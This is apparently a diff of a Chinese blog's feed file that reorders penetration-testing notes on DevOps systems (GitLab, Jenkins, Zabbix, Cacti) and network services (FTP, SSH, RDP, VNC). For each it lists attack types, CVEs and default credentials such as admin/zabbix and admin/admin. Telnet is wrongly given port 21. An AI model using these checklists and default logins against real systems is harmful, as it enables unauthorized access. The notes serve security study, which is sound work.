-<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
-<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://www.seebug.org/vuldb/ssvid-92538</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限。</span><br><span class="line">•   端口：80</span><br><span class="line">lighttpd</span><br><span class="line"></span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
+<p>一般分自动化部署和运维监控相关的的工具。漏洞可以通过搜索引擎搜索，github搜索，ExploitDB搜索，官网上的安全通告获取。<br>内网的通用类应用比较常见的问题是弱口令，如果一个管理员可以登录几个系统，那在这几个系统的账号、密码也基本上是一样的。</p>
+<h3 id="1、Gitlab"><a href="#1、Gitlab" class="headerlink" title="1、Gitlab"></a>1、Gitlab</h3><p>GitLab是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的项目仓库，可通过Web界面进行访问公开的或者私人项目。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   任意文件读取漏洞</span><br><span class="line">•   意用户 token 泄露漏洞</span><br><span class="line">•   命令执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://blog.knownsec.com/2016/11/gitlab-file-read-vulnerability-cve-2016-9086-and-access-all-user-authentication-token/</span><br><span class="line"></span><br><span class="line">http://rinige.com/index.php/archives/577/</span><br></pre></td></tr></table></figure>
+<h3 id="2、Jenkins"><a href="#2、Jenkins" class="headerlink" title="2、Jenkins"></a>2、Jenkins</h3><p>Jenkins是一种跨平台的持续集成和交付的应用软件，它便于不断稳定地交付新的软件版本，并提高你的工作效率。这款开发运维工具还让开发人员更容易把项目的变化整合起来，并使用大量的测试和部署技术。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   远程代码执行漏洞</span><br><span class="line">•   反序列化漏洞</span><br><span class="line">•   未授权访问漏洞</span><br><span class="line">•   登录入口爆破</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://www.cnblogs.com/backlion/p/6813260.html</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/86018</span><br><span class="line"></span><br><span class="line">https://paper.seebug.org/199/</span><br></pre></td></tr></table></figure>
+<h3 id="3、Puppet"><a href="#3、Puppet" class="headerlink" title="3、Puppet"></a>3、Puppet</h3><p>Puppet Enterprise专门管理基础设施即代码(IAC)，在这种类型的IT基础设施配置过程中，系统用代码而不是脚本流程来自动构建、管理和配置。由于它是代码，整个过程易于重复。Puppet有助于更容易控制版本、自动化测试和持续交付，可以更快速地响应问题或错误。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   可利用漏洞，很少公开的POC</span><br><span class="line">•   反序列化</span><br><span class="line">•   远程命令执行</span><br></pre></td></tr></table></figure>
+<h3 id="4、Ansible"><a href="#4、Ansible" class="headerlink" title="4、Ansible"></a>4、Ansible</h3><p>Ansible是一种配置和管理工具，面向客户端的软件部署和配置，支持Unix、Linux和Windows。它使 用JSON和YAML，而不是IAC，根本不需要节点代理就可以安装。它可以通过OpenStack在内部系统上使用，也可以在亚马逊EC2上使用。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   远程代码执行</span><br></pre></td></tr></table></figure>
+<h3 id="5、Nagios"><a href="#5、Nagios" class="headerlink" title="5、Nagios"></a>5、Nagios</h3><p>Nagios是一款开源的电脑系统和网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设置，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   代码执行</span><br><span class="line">•   SQLi</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.bugku.com/thread-87-1-1.html</span><br><span class="line">http://www.mottoin.com/93936.html</span><br></pre></td></tr></table></figure>
+<h3 id="6、Zabbix"><a href="#6、Zabbix" class="headerlink" title="6、Zabbix"></a>6、Zabbix</h3><p>Zabbix 是一款强大的开源分布式监控系统, 能够将SNMP、JMX、Zabbix Agent提供的数据通过WEB GUI的方式进行展示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞（具体参考 ExploitDB）：</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   SQLi</span><br><span class="line">•   shell 命令注入</span><br><span class="line">•   认证绕过</span><br><span class="line">•   默认账户与密码，默认口令 admin/zabbix，或者是guest/空</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://blog.csdn.net/ytuo1223/article/details/45937981</span><br><span class="line"></span><br><span class="line">http://vinc.top/2017/04/18/zabbix%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</span><br><span class="line"></span><br><span class="line">http://www.mottoin.com/87570.html</span><br></pre></td></tr></table></figure>
+<h3 id="7、Cacit"><a href="#7、Cacit" class="headerlink" title="7、Cacit"></a>7、Cacit</h3><p>Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   任意代码执行</span><br><span class="line">•   SQLi</span><br><span class="line">•   登录爆破</span><br><span class="line">•   默认密码admin/admin</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2011-02674.html</span><br></pre></td></tr></table></figure>
+<h3 id="8、Splunk"><a href="#8、Splunk" class="headerlink" title="8、Splunk"></a>8、Splunk</h3><p>Splunk Enterprise 可以从任何来源监控和分析机器数据，以提供操作智能，从而优化您的 IT、安全和业务绩效。Splunk Enterprise 具有直观的分析功能、机器学习、打包应用程序和开放式 API，是一个灵活的平台，可从重点用例扩展到企业范围的分析主干。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   信息泄露</span><br><span class="line">•   命令注入</span><br><span class="line">•   服务端请求伪造</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">ExploitDB 搜索</span><br></pre></td></tr></table></figure>
 
 
 
 
-
-
-
-
-
-
-
-
-
-
-]]></content>
-      <tags>
-        <tag>记录</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>（四）渗透技巧—常见服务、协议</title>
-    <url>/2019/04/15/%EF%BC%88%E5%9B%9B%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E3%80%81%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<blockquote>
-<p>文章不记得从哪个公众号上拉下来的了</p>
-</blockquote><a id="more"></a>
-<h3 id="1、FTP-服务"><a href="#1、FTP-服务" class="headerlink" title="1、FTP 服务"></a>1、FTP 服务</h3><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：</span><br><span class="line">20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：ftp的爆破工具有很多，这里我推荐owasp的Bruter 以及msf中ftp爆破模块；</span><br><span class="line">•   匿名访问：用户名：anonymous 密码：为空或任意邮箱</span><br><span class="line">•   嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）</span><br><span class="line">•   后门 vsftp</span><br><span class="line">•   远程溢出</span><br><span class="line">•   跳转攻击</span><br></pre></td></tr></table></figure>
-<h3 id="2、NFS-服务"><a href="#2、NFS-服务" class="headerlink" title="2、NFS 服务"></a>2、NFS 服务</h3><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击方法：</span><br><span class="line">•未授权访问</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.freebuf.com/articles/network/159468.html</span><br><span class="line"></span><br><span class="line">http://www.vuln.cn/6368</span><br></pre></td></tr></table></figure>
-<h3 id="3、Samba服务"><a href="#3、Samba服务" class="headerlink" title="3、Samba服务"></a>3、Samba服务</h3><p>Samba是linux和unix系统上实现SMB/CIFS协议的一个免费软件，由服务器和客户端程序构成。而SMB是局域网支持共享文件和打印机的一种通信协议，为局域网内不同计算机之间提供文件及打印机等资源的共享服务。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击方法：</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   弱口令</span><br><span class="line">•   未授权访问（public）</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.91ri.org/17114.html</span><br></pre></td></tr></table></figure>
-<h3 id="4、SSH-服务"><a href="#4、SSH-服务" class="headerlink" title="4、SSH 服务"></a>4、SSH 服务</h3><p>SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：22</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破</span><br><span class="line">•   后门</span><br><span class="line">•   漏洞：28退格漏洞、OpenSSL漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://cloud.tencent.com/developer/article/1078187</span><br></pre></td></tr></table></figure>
-<h3 id="5、Telnet-服务"><a href="#5、Telnet-服务" class="headerlink" title="5、Telnet 服务"></a>5、Telnet 服务</h3><p>Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在終端使用者的电脑上使用telnet程序，用它连接到服务器。<br>終端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：21</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破</span><br><span class="line">•   嗅探</span><br></pre></td></tr></table></figure>
-<h3 id="6、Windows-远程连接（rdp）"><a href="#6、Windows-远程连接（rdp）" class="headerlink" title="6、Windows 远程连接（rdp）"></a>6、Windows 远程连接（rdp）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：3389</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破</span><br><span class="line">•   Shift粘滞键后门：5次shift后门</span><br><span class="line">•   利用ms12-020攻击3389端口</span><br><span class="line">•   CVE-2019-0708</span><br></pre></td></tr></table></figure>
-<h3 id="7、VNC服务"><a href="#7、VNC服务" class="headerlink" title="7、VNC服务"></a>7、VNC服务</h3><p>VNC（Virtual Network Computing），为一种使用RFB协议的显示屏画面分享及远程操作软件。此软件借由网络，可发送键盘与鼠标的动作及即时的显示屏画面。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：</span><br><span class="line">5900+桌面ID（5901；5902）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   认证口令绕过：</span><br><span class="line">•   拒绝服务攻击：（CVE-2015-5239）</span><br><span class="line">•   权限提升：（CVE-2013-6886）</span><br></pre></td></tr></table></figure>
-<h3 id="8、SMTP协议"><a href="#8、SMTP协议" class="headerlink" title="8、SMTP协议"></a>8、SMTP协议</h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：25（smtp）、465（smtps）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   未授权访问</span><br></pre></td></tr></table></figure>
-<h3 id="9、POP3协议"><a href="#9、POP3协议" class="headerlink" title="9、POP3协议"></a>9、POP3协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：109（POP2）、110（POP3）、995（POP3S）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破；弱口令</span><br><span class="line">•   未授权访问</span><br></pre></td></tr></table></figure>
-<h3 id="10、DNS服务"><a href="#10、DNS服务" class="headerlink" title="10、DNS服务"></a>10、DNS服务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：53</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   区域传输漏洞</span><br></pre></td></tr></table></figure>
-<h3 id="11、IMAP协议"><a href="#11、IMAP协议" class="headerlink" title="11、IMAP协议"></a>11、IMAP协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：143（imap）、993（imaps）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   配置不当</span><br></pre></td></tr></table></figure>
-<h3 id="12、SNMP协议"><a href="#12、SNMP协议" class="headerlink" title="12、SNMP协议"></a>12、SNMP协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：161</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br></pre></td></tr></table></figure>
-<h3 id="13、DHCP服务"><a href="#13、DHCP服务" class="headerlink" title="13、DHCP服务"></a>13、DHCP服务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：67&amp;68、546（DHCP Failover做双机热备的）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   DHCP劫持</span><br></pre></td></tr></table></figure>
 
 
 
@@ -3170,32 +3225,31 @@
       </tags>
   </entry>
   <entry>
-    <title>（二）渗透技巧—常见运维系统</title>
-    <url>/2019/04/15/%EF%BC%88%E4%BA%8C%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%B8%B8%E8%A7%81%E8%BF%90%E7%BB%B4%E7%B3%BB%E7%BB%9F/</url>
+    <title>（四）渗透技巧—常见服务、协议</title>
+    <url>/2019/04/15/%EF%BC%88%E5%9B%9B%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E3%80%81%E5%8D%8F%E8%AE%AE/</url>
     <content><![CDATA[<blockquote>
 <p>文章不记得从哪个公众号上拉下来的了</p>
 </blockquote><a id="more"></a>
-<p>一般分自动化部署和运维监控相关的的工具。漏洞可以通过搜索引擎搜索，github搜索，ExploitDB搜索，官网上的安全通告获取。<br>内网的通用类应用比较常见的问题是弱口令，如果一个管理员可以登录几个系统，那在这几个系统的账号、密码也基本上是一样的。</p>
-<h3 id="1、Gitlab"><a href="#1、Gitlab" class="headerlink" title="1、Gitlab"></a>1、Gitlab</h3><p>GitLab是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的项目仓库，可通过Web界面进行访问公开的或者私人项目。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   任意文件读取漏洞</span><br><span class="line">•   意用户 token 泄露漏洞</span><br><span class="line">•   命令执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://blog.knownsec.com/2016/11/gitlab-file-read-vulnerability-cve-2016-9086-and-access-all-user-authentication-token/</span><br><span class="line"></span><br><span class="line">http://rinige.com/index.php/archives/577/</span><br></pre></td></tr></table></figure>
-<h3 id="2、Jenkins"><a href="#2、Jenkins" class="headerlink" title="2、Jenkins"></a>2、Jenkins</h3><p>Jenkins是一种跨平台的持续集成和交付的应用软件，它便于不断稳定地交付新的软件版本，并提高你的工作效率。这款开发运维工具还让开发人员更容易把项目的变化整合起来，并使用大量的测试和部署技术。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   远程代码执行漏洞</span><br><span class="line">•   反序列化漏洞</span><br><span class="line">•   未授权访问漏洞</span><br><span class="line">•   登录入口爆破</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://www.cnblogs.com/backlion/p/6813260.html</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/86018</span><br><span class="line"></span><br><span class="line">https://paper.seebug.org/199/</span><br></pre></td></tr></table></figure>
-<h3 id="3、Puppet"><a href="#3、Puppet" class="headerlink" title="3、Puppet"></a>3、Puppet</h3><p>Puppet Enterprise专门管理基础设施即代码(IAC)，在这种类型的IT基础设施配置过程中，系统用代码而不是脚本流程来自动构建、管理和配置。由于它是代码，整个过程易于重复。Puppet有助于更容易控制版本、自动化测试和持续交付，可以更快速地响应问题或错误。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   可利用漏洞，很少公开的POC</span><br><span class="line">•   反序列化</span><br><span class="line">•   远程命令执行</span><br></pre></td></tr></table></figure>
-<h3 id="4、Ansible"><a href="#4、Ansible" class="headerlink" title="4、Ansible"></a>4、Ansible</h3><p>Ansible是一种配置和管理工具，面向客户端的软件部署和配置，支持Unix、Linux和Windows。它使 用JSON和YAML，而不是IAC，根本不需要节点代理就可以安装。它可以通过OpenStack在内部系统上使用，也可以在亚马逊EC2上使用。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   远程代码执行</span><br></pre></td></tr></table></figure>
-<h3 id="5、Nagios"><a href="#5、Nagios" class="headerlink" title="5、Nagios"></a>5、Nagios</h3><p>Nagios是一款开源的电脑系统和网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设置，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   代码执行</span><br><span class="line">•   SQLi</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.bugku.com/thread-87-1-1.html</span><br><span class="line">http://www.mottoin.com/93936.html</span><br></pre></td></tr></table></figure>
-<h3 id="6、Zabbix"><a href="#6、Zabbix" class="headerlink" title="6、Zabbix"></a>6、Zabbix</h3><p>Zabbix 是一款强大的开源分布式监控系统, 能够将SNMP、JMX、Zabbix Agent提供的数据通过WEB GUI的方式进行展示。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞（具体参考 ExploitDB）：</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   SQLi</span><br><span class="line">•   shell 命令注入</span><br><span class="line">•   认证绕过</span><br><span class="line">•   默认账户与密码，默认口令 admin/zabbix，或者是guest/空</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://blog.csdn.net/ytuo1223/article/details/45937981</span><br><span class="line"></span><br><span class="line">http://vinc.top/2017/04/18/zabbix%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</span><br><span class="line"></span><br><span class="line">http://www.mottoin.com/87570.html</span><br></pre></td></tr></table></figure>
-<h3 id="7、Cacit"><a href="#7、Cacit" class="headerlink" title="7、Cacit"></a>7、Cacit</h3><p>Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   任意代码执行</span><br><span class="line">•   SQLi</span><br><span class="line">•   登录爆破</span><br><span class="line">•   默认密码admin/admin</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2011-02674.html</span><br></pre></td></tr></table></figure>
-<h3 id="8、Splunk"><a href="#8、Splunk" class="headerlink" title="8、Splunk"></a>8、Splunk</h3><p>Splunk Enterprise 可以从任何来源监控和分析机器数据，以提供操作智能，从而优化您的 IT、安全和业务绩效。Splunk Enterprise 具有直观的分析功能、机器学习、打包应用程序和开放式 API，是一个灵活的平台，可从重点用例扩展到企业范围的分析主干。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   信息泄露</span><br><span class="line">•   命令注入</span><br><span class="line">•   服务端请求伪造</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">ExploitDB 搜索</span><br></pre></td></tr></table></figure>
-
-
-
-
+<h3 id="1、FTP-服务"><a href="#1、FTP-服务" class="headerlink" title="1、FTP 服务"></a>1、FTP 服务</h3><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：</span><br><span class="line">20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：ftp的爆破工具有很多，这里我推荐owasp的Bruter 以及msf中ftp爆破模块；</span><br><span class="line">•   匿名访问：用户名：anonymous 密码：为空或任意邮箱</span><br><span class="line">•   嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）</span><br><span class="line">•   后门 vsftp</span><br><span class="line">•   远程溢出</span><br><span class="line">•   跳转攻击</span><br></pre></td></tr></table></figure>
+<h3 id="2、NFS-服务"><a href="#2、NFS-服务" class="headerlink" title="2、NFS 服务"></a>2、NFS 服务</h3><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击方法：</span><br><span class="line">•未授权访问</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.freebuf.com/articles/network/159468.html</span><br><span class="line"></span><br><span class="line">http://www.vuln.cn/6368</span><br></pre></td></tr></table></figure>
+<h3 id="3、Samba服务"><a href="#3、Samba服务" class="headerlink" title="3、Samba服务"></a>3、Samba服务</h3><p>Samba是linux和unix系统上实现SMB/CIFS协议的一个免费软件，由服务器和客户端程序构成。而SMB是局域网支持共享文件和打印机的一种通信协议，为局域网内不同计算机之间提供文件及打印机等资源的共享服务。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击方法：</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   弱口令</span><br><span class="line">•   未授权访问（public）</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.91ri.org/17114.html</span><br></pre></td></tr></table></figure>
+<h3 id="4、SSH-服务"><a href="#4、SSH-服务" class="headerlink" title="4、SSH 服务"></a>4、SSH 服务</h3><p>SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：22</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破</span><br><span class="line">•   后门</span><br><span class="line">•   漏洞：28退格漏洞、OpenSSL漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://cloud.tencent.com/developer/article/1078187</span><br></pre></td></tr></table></figure>
+<h3 id="5、Telnet-服务"><a href="#5、Telnet-服务" class="headerlink" title="5、Telnet 服务"></a>5、Telnet 服务</h3><p>Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在終端使用者的电脑上使用telnet程序，用它连接到服务器。<br>終端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：21</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破</span><br><span class="line">•   嗅探</span><br></pre></td></tr></table></figure>
+<h3 id="6、Windows-远程连接（rdp）"><a href="#6、Windows-远程连接（rdp）" class="headerlink" title="6、Windows 远程连接（rdp）"></a>6、Windows 远程连接（rdp）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：3389</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破</span><br><span class="line">•   Shift粘滞键后门：5次shift后门</span><br><span class="line">•   利用ms12-020攻击3389端口</span><br><span class="line">•   CVE-2019-0708</span><br></pre></td></tr></table></figure>
+<h3 id="7、VNC服务"><a href="#7、VNC服务" class="headerlink" title="7、VNC服务"></a>7、VNC服务</h3><p>VNC（Virtual Network Computing），为一种使用RFB协议的显示屏画面分享及远程操作软件。此软件借由网络，可发送键盘与鼠标的动作及即时的显示屏画面。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：</span><br><span class="line">5900+桌面ID（5901；5902）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   认证口令绕过：</span><br><span class="line">•   拒绝服务攻击：（CVE-2015-5239）</span><br><span class="line">•   权限提升：（CVE-2013-6886）</span><br></pre></td></tr></table></figure>
+<h3 id="8、SMTP协议"><a href="#8、SMTP协议" class="headerlink" title="8、SMTP协议"></a>8、SMTP协议</h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：25（smtp）、465（smtps）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   未授权访问</span><br></pre></td></tr></table></figure>
+<h3 id="9、POP3协议"><a href="#9、POP3协议" class="headerlink" title="9、POP3协议"></a>9、POP3协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：109（POP2）、110（POP3）、995（POP3S）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破；弱口令</span><br><span class="line">•   未授权访问</span><br></pre></td></tr></table></figure>
+<h3 id="10、DNS服务"><a href="#10、DNS服务" class="headerlink" title="10、DNS服务"></a>10、DNS服务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：53</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   区域传输漏洞</span><br></pre></td></tr></table></figure>
+<h3 id="11、IMAP协议"><a href="#11、IMAP协议" class="headerlink" title="11、IMAP协议"></a>11、IMAP协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：143（imap）、993（imaps）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   配置不当</span><br></pre></td></tr></table></figure>
+<h3 id="12、SNMP协议"><a href="#12、SNMP协议" class="headerlink" title="12、SNMP协议"></a>12、SNMP协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：161</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br></pre></td></tr></table></figure>
+<h3 id="13、DHCP服务"><a href="#13、DHCP服务" class="headerlink" title="13、DHCP服务"></a>13、DHCP服务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：67&amp;68、546（DHCP Failover做双机热备的）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   DHCP劫持</span><br></pre></td></tr></table></figure>
 
 
 
